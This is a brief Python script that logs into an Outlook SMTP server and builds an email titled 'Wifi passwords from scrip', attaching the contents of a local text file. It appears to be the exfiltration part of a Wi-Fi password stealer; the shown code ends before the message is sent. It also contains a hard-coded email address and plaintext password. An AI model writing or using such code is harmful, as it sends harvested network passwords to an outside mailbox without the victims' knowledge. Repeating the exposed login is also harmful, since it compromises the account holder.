import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

s = smtplib.SMTP('smtp-mail.outlook.com', 587)

s.ehlo()

s.login('tbrancosilva@hotmail.com', 'DV9344**')

msg = MIMEMultipart()
msg['From'] = 'tmdbts'
msg['To'] = 'tbrancosilva@gmail.com'
msg['Subject'] = 'Wifi passwords from scrip'

with open('body_message.txt', 'r') as f:
    message = f.read()

msg.attach(MIMEText(message, 'plain'))
